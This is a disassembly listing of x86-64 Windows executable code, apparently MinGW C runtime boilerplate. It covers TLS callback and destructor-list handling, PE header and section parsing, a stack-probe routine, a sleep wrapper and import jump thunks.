  402712:	56                   	push   %rsi
  402713:	53                   	push   %rbx
  402714:	48 83 ec 28          	sub    $0x28,%rsp
  402718:	48 8d 0d e1 61 00 00 	lea    0x61e1(%rip),%rcx        # 0x408900
  40271f:	ff 15 97 6b 00 00    	call   *0x6b97(%rip)        # 0x4092bc
  402725:	48 8b 1d b4 61 00 00 	mov    0x61b4(%rip),%rbx        # 0x4088e0
  40272c:	48 85 db             	test   %rbx,%rbx
  40272f:	74 33                	je     0x402764
  402731:	48 8b 2d 14 6c 00 00 	mov    0x6c14(%rip),%rbp        # 0x40934c
  402738:	48 8b 3d 9d 6b 00 00 	mov    0x6b9d(%rip),%rdi        # 0x4092dc
  40273f:	90                   	nop
  402740:	8b 0b                	mov    (%rbx),%ecx
  402742:	ff d5                	call   *%rbp
  402744:	48 89 c6             	mov    %rax,%rsi
  402747:	ff d7                	call   *%rdi
  402749:	85 c0                	test   %eax,%eax
  40274b:	75 0e                	jne    0x40275b
  40274d:	48 85 f6             	test   %rsi,%rsi
  402750:	74 09                	je     0x40275b
  402752:	48 8b 43 08          	mov    0x8(%rbx),%rax
  402756:	48 89 f1             	mov    %rsi,%rcx
  402759:	ff d0                	call   *%rax
  40275b:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
  40275f:	48 85 db             	test   %rbx,%rbx
  402762:	75 dc                	jne    0x402740
  402764:	48 8d 0d 95 61 00 00 	lea    0x6195(%rip),%rcx        # 0x408900
  40276b:	48 83 c4 28          	add    $0x28,%rsp
  40276f:	5b                   	pop    %rbx
  402770:	5e                   	pop    %rsi
  402771:	5f                   	pop    %rdi
  402772:	5d                   	pop    %rbp
  402773:	48 ff 25 8a 6b 00 00 	rex.W jmp *0x6b8a(%rip)        # 0x409304
  40277a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  402780:	55                   	push   %rbp
  402781:	57                   	push   %rdi
  402782:	56                   	push   %rsi
  402783:	53                   	push   %rbx
  402784:	48 83 ec 28          	sub    $0x28,%rsp
  402788:	8b 05 5a 61 00 00    	mov    0x615a(%rip),%eax        # 0x4088e8
  40278e:	31 f6                	xor    %esi,%esi
  402790:	85 c0                	test   %eax,%eax
  402792:	89 cd                	mov    %ecx,%ebp
  402794:	48 89 d7             	mov    %rdx,%rdi
  402797:	75 0b                	jne    0x4027a4
  402799:	89 f0                	mov    %esi,%eax
  40279b:	48 83 c4 28          	add    $0x28,%rsp
  40279f:	5b                   	pop    %rbx
  4027a0:	5e                   	pop    %rsi
  4027a1:	5f                   	pop    %rdi
  4027a2:	5d                   	pop    %rbp
  4027a3:	c3                   	ret
  4027a4:	ba 18 00 00 00       	mov    $0x18,%edx
  4027a9:	b9 01 00 00 00       	mov    $0x1,%ecx
  4027ae:	e8 95 06 00 00       	call   0x402e48
  4027b3:	48 85 c0             	test   %rax,%rax
  4027b6:	48 89 c3             	mov    %rax,%rbx
  4027b9:	74 3d                	je     0x4027f8
  4027bb:	89 28                	mov    %ebp,(%rax)
  4027bd:	48 8d 0d 3c 61 00 00 	lea    0x613c(%rip),%rcx        # 0x408900
  4027c4:	48 89 78 08          	mov    %rdi,0x8(%rax)
  4027c8:	ff 15 ee 6a 00 00    	call   *0x6aee(%rip)        # 0x4092bc
  4027ce:	48 8b 05 0b 61 00 00 	mov    0x610b(%rip),%rax        # 0x4088e0
  4027d5:	48 8d 0d 24 61 00 00 	lea    0x6124(%rip),%rcx        # 0x408900
  4027dc:	48 89 1d fd 60 00 00 	mov    %rbx,0x60fd(%rip)        # 0x4088e0
  4027e3:	48 89 43 10          	mov    %rax,0x10(%rbx)
  4027e7:	ff 15 17 6b 00 00    	call   *0x6b17(%rip)        # 0x409304
  4027ed:	89 f0                	mov    %esi,%eax
  4027ef:	48 83 c4 28          	add    $0x28,%rsp
  4027f3:	5b                   	pop    %rbx
  4027f4:	5e                   	pop    %rsi
  4027f5:	5f                   	pop    %rdi
  4027f6:	5d                   	pop    %rbp
  4027f7:	c3                   	ret
  4027f8:	be ff ff ff ff       	mov    $0xffffffff,%esi
  4027fd:	eb 9a                	jmp    0x402799
  4027ff:	90                   	nop
  402800:	53                   	push   %rbx
  402801:	48 83 ec 20          	sub    $0x20,%rsp
  402805:	8b 05 dd 60 00 00    	mov    0x60dd(%rip),%eax        # 0x4088e8
  40280b:	85 c0                	test   %eax,%eax
  40280d:	89 cb                	mov    %ecx,%ebx
  40280f:	75 0f                	jne    0x402820
  402811:	31 c0                	xor    %eax,%eax
  402813:	48 83 c4 20          	add    $0x20,%rsp
  402817:	5b                   	pop    %rbx
  402818:	c3                   	ret
  402819:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  402820:	48 8d 0d d9 60 00 00 	lea    0x60d9(%rip),%rcx        # 0x408900
  402827:	ff 15 8f 6a 00 00    	call   *0x6a8f(%rip)        # 0x4092bc
  40282d:	48 8b 05 ac 60 00 00 	mov    0x60ac(%rip),%rax        # 0x4088e0
  402834:	48 85 c0             	test   %rax,%rax
  402837:	74 1a                	je     0x402853
  402839:	8b 10                	mov    (%rax),%edx
  40283b:	39 d3                	cmp    %edx,%ebx
  40283d:	75 0b                	jne    0x40284a
  40283f:	eb 4f                	jmp    0x402890
  402841:	8b 11                	mov    (%rcx),%edx
  402843:	39 da                	cmp    %ebx,%edx
  402845:	74 29                	je     0x402870
  402847:	48 89 c8             	mov    %rcx,%rax
  40284a:	48 8b 48 10          	mov    0x10(%rax),%rcx
  40284e:	48 85 c9             	test   %rcx,%rcx
  402851:	75 ee                	jne    0x402841
  402853:	48 8d 0d a6 60 00 00 	lea    0x60a6(%rip),%rcx        # 0x408900
  40285a:	ff 15 a4 6a 00 00    	call   *0x6aa4(%rip)        # 0x409304
  402860:	31 c0                	xor    %eax,%eax
  402862:	48 83 c4 20          	add    $0x20,%rsp
  402866:	5b                   	pop    %rbx
  402867:	c3                   	ret
  402868:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40286f:	00 
  402870:	48 8b 51 10          	mov    0x10(%rcx),%rdx
  402874:	48 89 50 10          	mov    %rdx,0x10(%rax)
  402878:	e8 a3 05 00 00       	call   0x402e20
  40287d:	48 8d 0d 7c 60 00 00 	lea    0x607c(%rip),%rcx        # 0x408900
  402884:	ff 15 7a 6a 00 00    	call   *0x6a7a(%rip)        # 0x409304
  40288a:	eb d4                	jmp    0x402860
  40288c:	0f 1f 40 00          	nopl   0x0(%rax)
  402890:	48 8b 50 10          	mov    0x10(%rax),%rdx
  402894:	48 89 c1             	mov    %rax,%rcx
  402897:	48 89 15 42 60 00 00 	mov    %rdx,0x6042(%rip)        # 0x4088e0
  40289e:	eb d8                	jmp    0x402878
  4028a0:	53                   	push   %rbx
  4028a1:	48 83 ec 20          	sub    $0x20,%rsp
  4028a5:	83 fa 01             	cmp    $0x1,%edx
  4028a8:	0f 84 92 00 00 00    	je     0x402940
  4028ae:	72 30                	jb     0x4028e0
  4028b0:	83 fa 02             	cmp    $0x2,%edx
  4028b3:	74 1b                	je     0x4028d0
  4028b5:	83 fa 03             	cmp    $0x3,%edx
  4028b8:	75 1b                	jne    0x4028d5
  4028ba:	8b 05 28 60 00 00    	mov    0x6028(%rip),%eax        # 0x4088e8
  4028c0:	85 c0                	test   %eax,%eax
  4028c2:	74 11                	je     0x4028d5
  4028c4:	e8 47 fe ff ff       	call   0x402710
  4028c9:	eb 0a                	jmp    0x4028d5
  4028cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4028d0:	e8 fb f4 ff ff       	call   0x401dd0
  4028d5:	b8 01 00 00 00       	mov    $0x1,%eax
  4028da:	48 83 c4 20          	add    $0x20,%rsp
  4028de:	5b                   	pop    %rbx
  4028df:	c3                   	ret
  4028e0:	8b 05 02 60 00 00    	mov    0x6002(%rip),%eax        # 0x4088e8
  4028e6:	85 c0                	test   %eax,%eax
  4028e8:	0f 85 82 00 00 00    	jne    0x402970
  4028ee:	8b 05 f4 5f 00 00    	mov    0x5ff4(%rip),%eax        # 0x4088e8
  4028f4:	83 f8 01             	cmp    $0x1,%eax
  4028f7:	75 dc                	jne    0x4028d5
  4028f9:	48 8b 0d e0 5f 00 00 	mov    0x5fe0(%rip),%rcx        # 0x4088e0
  402900:	48 85 c9             	test   %rcx,%rcx
  402903:	74 11                	je     0x402916
  402905:	48 8b 59 10          	mov    0x10(%rcx),%rbx
  402909:	e8 12 05 00 00       	call   0x402e20
  40290e:	48 85 db             	test   %rbx,%rbx
  402911:	48 89 d9             	mov    %rbx,%rcx
  402914:	75 ef                	jne    0x402905
  402916:	48 8d 0d e3 5f 00 00 	lea    0x5fe3(%rip),%rcx        # 0x408900
  40291d:	48 c7 05 b8 5f 00 00 	movq   $0x0,0x5fb8(%rip)        # 0x4088e0
  402924:	00 00 00 00 
  402928:	c7 05 b6 5f 00 00 00 	movl   $0x0,0x5fb6(%rip)        # 0x4088e8
  40292f:	00 00 00 
  402932:	ff 15 7c 69 00 00    	call   *0x697c(%rip)        # 0x4092b4
  402938:	eb 9b                	jmp    0x4028d5
  40293a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  402940:	8b 05 a2 5f 00 00    	mov    0x5fa2(%rip),%eax        # 0x4088e8
  402946:	85 c0                	test   %eax,%eax
  402948:	74 16                	je     0x402960
  40294a:	c7 05 94 5f 00 00 01 	movl   $0x1,0x5f94(%rip)        # 0x4088e8
  402951:	00 00 00 
  402954:	b8 01 00 00 00       	mov    $0x1,%eax
  402959:	48 83 c4 20          	add    $0x20,%rsp
  40295d:	5b                   	pop    %rbx
  40295e:	c3                   	ret
  40295f:	90                   	nop
  402960:	48 8d 0d 99 5f 00 00 	lea    0x5f99(%rip),%rcx        # 0x408900
  402967:	ff 15 8f 69 00 00    	call   *0x698f(%rip)        # 0x4092fc
  40296d:	eb db                	jmp    0x40294a
  40296f:	90                   	nop
  402970:	e8 9b fd ff ff       	call   0x402710
  402975:	e9 74 ff ff ff       	jmp    0x4028ee
  40297a:	90                   	nop
  40297b:	90                   	nop
  40297c:	90                   	nop
  40297d:	90                   	nop
  40297e:	90                   	nop
  40297f:	90                   	nop
  402980:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
  402984:	48 01 c1             	add    %rax,%rcx
  402987:	31 c0                	xor    %eax,%eax
  402989:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
  40298f:	74 01                	je     0x402992
  402991:	c3                   	ret
  402992:	31 c0                	xor    %eax,%eax
  402994:	66 81 79 18 0b 02    	cmpw   $0x20b,0x18(%rcx)
  40299a:	0f 94 c0             	sete   %al
  40299d:	c3                   	ret
  40299e:	66 90                	xchg   %ax,%ax
  4029a0:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
  4029a5:	74 09                	je     0x4029b0
  4029a7:	31 c0                	xor    %eax,%eax
  4029a9:	c3                   	ret
  4029aa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4029b0:	eb ce                	jmp    0x402980
  4029b2:	0f 1f 40 00          	nopl   0x0(%rax)
  4029b6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4029bd:	00 00 00 
  4029c0:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
  4029c4:	48 01 c1             	add    %rax,%rcx
  4029c7:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
  4029cb:	48 8d 44 01 18       	lea    0x18(%rcx,%rax,1),%rax
  4029d0:	0f b7 49 06          	movzwl 0x6(%rcx),%ecx
  4029d4:	85 c9                	test   %ecx,%ecx
  4029d6:	74 29                	je     0x402a01
  4029d8:	83 e9 01             	sub    $0x1,%ecx
  4029db:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
  4029df:	4c 8d 4c c8 28       	lea    0x28(%rax,%rcx,8),%r9
  4029e4:	44 8b 40 0c          	mov    0xc(%rax),%r8d
  4029e8:	49 39 d0             	cmp    %rdx,%r8
  4029eb:	4c 89 c1             	mov    %r8,%rcx
  4029ee:	77 08                	ja     0x4029f8
  4029f0:	03 48 08             	add    0x8(%rax),%ecx
  4029f3:	48 39 d1             	cmp    %rdx,%rcx
  4029f6:	77 0b                	ja     0x402a03
  4029f8:	48 83 c0 28          	add    $0x28,%rax
  4029fc:	4c 39 c8             	cmp    %r9,%rax
  4029ff:	75 e3                	jne    0x4029e4
  402a01:	31 c0                	xor    %eax,%eax
  402a03:	c3                   	ret
  402a04:	66 90                	xchg   %ax,%ax
  402a06:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  402a0d:	00 00 00 
  402a10:	57                   	push   %rdi
  402a11:	56                   	push   %rsi
  402a12:	53                   	push   %rbx
  402a13:	48 83 ec 20          	sub    $0x20,%rsp
  402a17:	48 89 ce             	mov    %rcx,%rsi
  402a1a:	e8 c1 03 00 00       	call   0x402de0
  402a1f:	48 83 f8 08          	cmp    $0x8,%rax
  402a23:	77 6b                	ja     0x402a90
  402a25:	48 8b 15 54 29 00 00 	mov    0x2954(%rip),%rdx        # 0x405380
  402a2c:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
  402a31:	75 5d                	jne    0x402a90
  402a33:	48 89 d1             	mov    %rdx,%rcx
  402a36:	e8 45 ff ff ff       	call   0x402980
  402a3b:	85 c0                	test   %eax,%eax
  402a3d:	74 51                	je     0x402a90
  402a3f:	48 63 4a 3c          	movslq 0x3c(%rdx),%rcx
  402a43:	48 01 d1             	add    %rdx,%rcx
  402a46:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
  402a4a:	48 8d 5c 01 18       	lea    0x18(%rcx,%rax,1),%rbx
  402a4f:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
  402a53:	85 c0                	test   %eax,%eax
  402a55:	74 39                	je     0x402a90
  402a57:	83 e8 01             	sub    $0x1,%eax
  402a5a:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  402a5e:	48 8d 7c c3 28       	lea    0x28(%rbx,%rax,8),%rdi
  402a63:	eb 09                	jmp    0x402a6e
  402a65:	48 83 c3 28          	add    $0x28,%rbx
  402a69:	48 39 fb             	cmp    %rdi,%rbx
  402a6c:	74 22                	je     0x402a90
  402a6e:	41 b8 08 00 00 00    	mov    $0x8,%r8d
  402a74:	48 89 f2             	mov    %rsi,%rdx
  402a77:	48 89 d9             	mov    %rbx,%rcx
  402a7a:	e8 59 03 00 00       	call   0x402dd8
  402a7f:	85 c0                	test   %eax,%eax
  402a81:	75 e2                	jne    0x402a65
  402a83:	48 89 d8             	mov    %rbx,%rax
  402a86:	48 83 c4 20          	add    $0x20,%rsp
  402a8a:	5b                   	pop    %rbx
  402a8b:	5e                   	pop    %rsi
  402a8c:	5f                   	pop    %rdi
  402a8d:	c3                   	ret
  402a8e:	66 90                	xchg   %ax,%ax
  402a90:	31 db                	xor    %ebx,%ebx
  402a92:	48 89 d8             	mov    %rbx,%rax
  402a95:	48 83 c4 20          	add    $0x20,%rsp
  402a99:	5b                   	pop    %rbx
  402a9a:	5e                   	pop    %rsi
  402a9b:	5f                   	pop    %rdi
  402a9c:	c3                   	ret
  402a9d:	0f 1f 00             	nopl   (%rax)
  402aa0:	48 83 ec 28          	sub    $0x28,%rsp
  402aa4:	4c 8b 05 d5 28 00 00 	mov    0x28d5(%rip),%r8        # 0x405380
  402aab:	66 41 81 38 4d 5a    	cmpw   $0x5a4d,(%r8)
  402ab1:	48 89 ca             	mov    %rcx,%rdx
  402ab4:	75 57                	jne    0x402b0d
  402ab6:	4c 89 c1             	mov    %r8,%rcx
  402ab9:	e8 c2 fe ff ff       	call   0x402980
  402abe:	85 c0                	test   %eax,%eax
  402ac0:	74 4b                	je     0x402b0d
  402ac2:	49 63 40 3c          	movslq 0x3c(%r8),%rax
  402ac6:	48 89 d1             	mov    %rdx,%rcx
  402ac9:	4c 29 c1             	sub    %r8,%rcx
  402acc:	49 01 c0             	add    %rax,%r8
  402acf:	41 0f b7 50 06       	movzwl 0x6(%r8),%edx
  402ad4:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
  402ad9:	85 d2                	test   %edx,%edx
  402adb:	49 8d 44 00 18       	lea    0x18(%r8,%rax,1),%rax
  402ae0:	74 2b                	je     0x402b0d
  402ae2:	83 ea 01             	sub    $0x1,%edx
  402ae5:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
  402ae9:	4c 8d 4c d0 28       	lea    0x28(%rax,%rdx,8),%r9
  402aee:	66 90                	xchg   %ax,%ax
  402af0:	44 8b 40 0c          	mov    0xc(%rax),%r8d
  402af4:	4c 39 c1             	cmp    %r8,%rcx
  402af7:	4c 89 c2             	mov    %r8,%rdx
  402afa:	72 08                	jb     0x402b04
  402afc:	03 50 08             	add    0x8(%rax),%edx
  402aff:	48 39 d1             	cmp    %rdx,%rcx
  402b02:	72 0b                	jb     0x402b0f
  402b04:	48 83 c0 28          	add    $0x28,%rax
  402b08:	4c 39 c8             	cmp    %r9,%rax
  402b0b:	75 e3                	jne    0x402af0
  402b0d:	31 c0                	xor    %eax,%eax
  402b0f:	48 83 c4 28          	add    $0x28,%rsp
  402b13:	c3                   	ret
  402b14:	66 90                	xchg   %ax,%ax
  402b16:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  402b1d:	00 00 00 
  402b20:	48 83 ec 28          	sub    $0x28,%rsp
  402b24:	48 8b 15 55 28 00 00 	mov    0x2855(%rip),%rdx        # 0x405380
  402b2b:	45 31 c0             	xor    %r8d,%r8d
  402b2e:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
  402b33:	74 0b                	je     0x402b40
  402b35:	44 89 c0             	mov    %r8d,%eax
  402b38:	48 83 c4 28          	add    $0x28,%rsp
  402b3c:	c3                   	ret
  402b3d:	0f 1f 00             	nopl   (%rax)
  402b40:	48 89 d1             	mov    %rdx,%rcx
  402b43:	e8 38 fe ff ff       	call   0x402980
  402b48:	85 c0                	test   %eax,%eax
  402b4a:	74 e9                	je     0x402b35
  402b4c:	48 63 42 3c          	movslq 0x3c(%rdx),%rax
  402b50:	44 0f b7 44 10 06    	movzwl 0x6(%rax,%rdx,1),%r8d
  402b56:	44 89 c0             	mov    %r8d,%eax
  402b59:	48 83 c4 28          	add    $0x28,%rsp
  402b5d:	c3                   	ret
  402b5e:	66 90                	xchg   %ax,%ax
  402b60:	48 83 ec 28          	sub    $0x28,%rsp
  402b64:	4c 8b 05 15 28 00 00 	mov    0x2815(%rip),%r8        # 0x405380
  402b6b:	66 41 81 38 4d 5a    	cmpw   $0x5a4d,(%r8)
  402b71:	48 89 ca             	mov    %rcx,%rdx
  402b74:	75 52                	jne    0x402bc8
  402b76:	4c 89 c1             	mov    %r8,%rcx
  402b79:	e8 02 fe ff ff       	call   0x402980
  402b7e:	85 c0                	test   %eax,%eax
  402b80:	74 46                	je     0x402bc8
  402b82:	49 63 48 3c          	movslq 0x3c(%r8),%rcx
  402b86:	4c 01 c1             	add    %r8,%rcx
  402b89:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
  402b8d:	48 8d 44 01 18       	lea    0x18(%rcx,%rax,1),%rax
  402b92:	0f b7 49 06          	movzwl 0x6(%rcx),%ecx
  402b96:	85 c9                	test   %ecx,%ecx
  402b98:	74 2e                	je     0x402bc8
  402b9a:	83 e9 01             	sub    $0x1,%ecx
  402b9d:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
  402ba1:	48 8d 4c c8 28       	lea    0x28(%rax,%rcx,8),%rcx
  402ba6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  402bad:	00 00 00 
  402bb0:	f6 40 27 20          	testb  $0x20,0x27(%rax)
  402bb4:	74 09                	je     0x402bbf
  402bb6:	48 85 d2             	test   %rdx,%rdx
  402bb9:	74 0f                	je     0x402bca
  402bbb:	48 83 ea 01          	sub    $0x1,%rdx
  402bbf:	48 83 c0 28          	add    $0x28,%rax
  402bc3:	48 39 c8             	cmp    %rcx,%rax
  402bc6:	75 e8                	jne    0x402bb0
  402bc8:	31 c0                	xor    %eax,%eax
  402bca:	48 83 c4 28          	add    $0x28,%rsp
  402bce:	c3                   	ret
  402bcf:	90                   	nop
  402bd0:	48 83 ec 28          	sub    $0x28,%rsp
  402bd4:	48 8b 15 a5 27 00 00 	mov    0x27a5(%rip),%rdx        # 0x405380
  402bdb:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
  402be0:	75 1e                	jne    0x402c00
  402be2:	48 89 d1             	mov    %rdx,%rcx
  402be5:	e8 96 fd ff ff       	call   0x402980
  402bea:	85 c0                	test   %eax,%eax
  402bec:	b8 00 00 00 00       	mov    $0x0,%eax
  402bf1:	48 0f 45 c2          	cmovne %rdx,%rax
  402bf5:	48 83 c4 28          	add    $0x28,%rsp
  402bf9:	c3                   	ret
  402bfa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  402c00:	31 c0                	xor    %eax,%eax
  402c02:	48 83 c4 28          	add    $0x28,%rsp
  402c06:	c3                   	ret
  402c07:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  402c0e:	00 00 
  402c10:	48 83 ec 28          	sub    $0x28,%rsp
  402c14:	4c 8b 05 65 27 00 00 	mov    0x2765(%rip),%r8        # 0x405380
  402c1b:	31 c0                	xor    %eax,%eax
  402c1d:	66 41 81 38 4d 5a    	cmpw   $0x5a4d,(%r8)
  402c23:	48 89 ca             	mov    %rcx,%rdx
  402c26:	74 08                	je     0x402c30
  402c28:	48 83 c4 28          	add    $0x28,%rsp
  402c2c:	c3                   	ret
  402c2d:	0f 1f 00             	nopl   (%rax)
  402c30:	4c 89 c1             	mov    %r8,%rcx
  402c33:	e8 48 fd ff ff       	call   0x402980
  402c38:	85 c0                	test   %eax,%eax
  402c3a:	74 ec                	je     0x402c28
  402c3c:	49 63 40 3c          	movslq 0x3c(%r8),%rax
  402c40:	48 89 d1             	mov    %rdx,%rcx
  402c43:	4c 29 c1             	sub    %r8,%rcx
  402c46:	49 01 c0             	add    %rax,%r8
  402c49:	41 0f b7 50 06       	movzwl 0x6(%r8),%edx
  402c4e:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
  402c53:	85 d2                	test   %edx,%edx
  402c55:	49 8d 44 00 18       	lea    0x18(%r8,%rax,1),%rax
  402c5a:	74 31                	je     0x402c8d
  402c5c:	83 ea 01             	sub    $0x1,%edx
  402c5f:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
  402c63:	4c 8d 4c d0 28       	lea    0x28(%rax,%rdx,8),%r9
  402c68:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  402c6f:	00 
  402c70:	44 8b 40 0c          	mov    0xc(%rax),%r8d
  402c74:	4c 39 c1             	cmp    %r8,%rcx
  402c77:	4c 89 c2             	mov    %r8,%rdx
  402c7a:	72 08                	jb     0x402c84
  402c7c:	03 50 08             	add    0x8(%rax),%edx
  402c7f:	48 39 d1             	cmp    %rdx,%rcx
  402c82:	72 10                	jb     0x402c94
  402c84:	48 83 c0 28          	add    $0x28,%rax
  402c88:	4c 39 c8             	cmp    %r9,%rax
  402c8b:	75 e3                	jne    0x402c70
  402c8d:	31 c0                	xor    %eax,%eax
  402c8f:	48 83 c4 28          	add    $0x28,%rsp
  402c93:	c3                   	ret
  402c94:	8b 40 24             	mov    0x24(%rax),%eax
  402c97:	f7 d0                	not    %eax
  402c99:	c1 e8 1f             	shr    $0x1f,%eax
  402c9c:	48 83 c4 28          	add    $0x28,%rsp
  402ca0:	c3                   	ret
  402ca1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  402ca6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  402cad:	00 00 00 
  402cb0:	48 83 ec 28          	sub    $0x28,%rsp
  402cb4:	4c 8b 1d c5 26 00 00 	mov    0x26c5(%rip),%r11        # 0x405380
  402cbb:	66 41 81 3b 4d 5a    	cmpw   $0x5a4d,(%r11)
  402cc1:	41 89 c9             	mov    %ecx,%r9d
  402cc4:	75 58                	jne    0x402d1e
  402cc6:	4c 89 d9             	mov    %r11,%rcx
  402cc9:	e8 b2 fc ff ff       	call   0x402980
  402cce:	85 c0                	test   %eax,%eax
  402cd0:	74 4c                	je     0x402d1e
  402cd2:	49 63 43 3c          	movslq 0x3c(%r11),%rax
  402cd6:	4c 01 d8             	add    %r11,%rax
  402cd9:	8b 90 90 00 00 00    	mov    0x90(%rax),%edx
  402cdf:	85 d2                	test   %edx,%edx
  402ce1:	74 3b                	je     0x402d1e
  402ce3:	0f b7 48 14          	movzwl 0x14(%rax),%ecx
  402ce7:	48 8d 4c 08 18       	lea    0x18(%rax,%rcx,1),%rcx
  402cec:	0f b7 40 06          	movzwl 0x6(%rax),%eax
  402cf0:	85 c0                	test   %eax,%eax
  402cf2:	74 2a                	je     0x402d1e
  402cf4:	83 e8 01             	sub    $0x1,%eax
  402cf7:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  402cfb:	48 8d 44 c1 28       	lea    0x28(%rcx,%rax,8),%rax
  402d00:	44 8b 51 0c          	mov    0xc(%rcx),%r10d
  402d04:	4c 39 d2             	cmp    %r10,%rdx
  402d07:	4d 89 d0             	mov    %r10,%r8
  402d0a:	72 09                	jb     0x402d15
  402d0c:	44 03 41 08          	add    0x8(%rcx),%r8d
  402d10:	4c 39 c2             	cmp    %r8,%rdx
  402d13:	72 10                	jb     0x402d25
  402d15:	48 83 c1 28          	add    $0x28,%rcx
  402d19:	48 39 c1             	cmp    %rax,%rcx
  402d1c:	75 e2                	jne    0x402d00
  402d1e:	31 c0                	xor    %eax,%eax
  402d20:	48 83 c4 28          	add    $0x28,%rsp
  402d24:	c3                   	ret
  402d25:	4c 01 da             	add    %r11,%rdx
  402d28:	75 0e                	jne    0x402d38
  402d2a:	eb f2                	jmp    0x402d1e
  402d2c:	0f 1f 40 00          	nopl   0x0(%rax)
  402d30:	41 83 e9 01          	sub    $0x1,%r9d
  402d34:	48 83 c2 14          	add    $0x14,%rdx
  402d38:	8b 4a 04             	mov    0x4(%rdx),%ecx
  402d3b:	85 c9                	test   %ecx,%ecx
  402d3d:	75 07                	jne    0x402d46
  402d3f:	8b 42 0c             	mov    0xc(%rdx),%eax
  402d42:	85 c0                	test   %eax,%eax
  402d44:	74 d8                	je     0x402d1e
  402d46:	45 85 c9             	test   %r9d,%r9d
  402d49:	7f e5                	jg     0x402d30
  402d4b:	8b 42 0c             	mov    0xc(%rdx),%eax
  402d4e:	4c 01 d8             	add    %r11,%rax
  402d51:	48 83 c4 28          	add    $0x28,%rsp
  402d55:	c3                   	ret
  402d56:	90                   	nop
  402d57:	90                   	nop
  402d58:	90                   	nop
  402d59:	90                   	nop
  402d5a:	90                   	nop
  402d5b:	90                   	nop
  402d5c:	90                   	nop
  402d5d:	90                   	nop
  402d5e:	90                   	nop
  402d5f:	90                   	nop
  402d60:	51                   	push   %rcx
  402d61:	50                   	push   %rax
  402d62:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
  402d68:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
  402d6d:	72 19                	jb     0x402d88
  402d6f:	48 81 e9 00 10 00 00 	sub    $0x1000,%rcx
  402d76:	48 83 09 00          	orq    $0x0,(%rcx)
  402d7a:	48 2d 00 10 00 00    	sub    $0x1000,%rax
  402d80:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
  402d86:	77 e7                	ja     0x402d6f
  402d88:	48 29 c1             	sub    %rax,%rcx
  402d8b:	48 83 09 00          	orq    $0x0,(%rcx)
  402d8f:	58                   	pop    %rax
  402d90:	59                   	pop    %rcx
  402d91:	c3                   	ret
  402d92:	90                   	nop
  402d93:	90                   	nop
  402d94:	90                   	nop
  402d95:	90                   	nop
  402d96:	90                   	nop
  402d97:	90                   	nop
  402d98:	90                   	nop
  402d99:	90                   	nop
  402d9a:	90                   	nop
  402d9b:	90                   	nop
  402d9c:	90                   	nop
  402d9d:	90                   	nop
  402d9e:	90                   	nop
  402d9f:	90                   	nop
  402da0:	48 83 ec 28          	sub    $0x28,%rsp
  402da4:	69 c9 e8 03 00 00    	imul   $0x3e8,%ecx,%ecx
  402daa:	ff 15 8c 65 00 00    	call   *0x658c(%rip)        # 0x40933c
  402db0:	31 c0                	xor    %eax,%eax
  402db2:	48 83 c4 28          	add    $0x28,%rsp
  402db6:	c3                   	ret
  402db7:	90                   	nop
  402db8:	90                   	nop
  402db9:	90                   	nop
  402dba:	90                   	nop
  402dbb:	90                   	nop
  402dbc:	90                   	nop
  402dbd:	90                   	nop
  402dbe:	90                   	nop
  402dbf:	90                   	nop
  402dc0:	e9 93 00 00 00       	jmp    0x402e58
  402dc5:	90                   	nop
  402dc6:	90                   	nop
  402dc7:	90                   	nop
  402dc8:	90                   	nop
  402dc9:	90                   	nop
  402dca:	90                   	nop
  402dcb:	90                   	nop
  402dcc:	90                   	nop
  402dcd:	90                   	nop
  402dce:	90                   	nop
  402dcf:	90                   	nop
  402dd0:	ff 25 9e 66 00 00    	jmp    *0x669e(%rip)        # 0x409474
  402dd6:	90                   	nop
  402dd7:	90                   	nop
  402dd8:	ff 25 8e 66 00 00    	jmp    *0x668e(%rip)        # 0x40946c
  402dde:	90                   	nop
  402ddf:	90                   	nop
  402de0:	ff 25 7e 66 00 00    	jmp    *0x667e(%rip)        # 0x409464
  402de6:	90                   	nop
  402de7:	90                   	nop
  402de8:	ff 25 6e 66 00 00    	jmp    *0x666e(%rip)        # 0x40945c
  402dee:	90                   	nop
  402def:	90                   	nop
  402df0:	ff 25 5e 66 00 00    	jmp    *0x665e(%rip)        # 0x409454
  402df6:	90                   	nop
  402df7:	90                   	nop
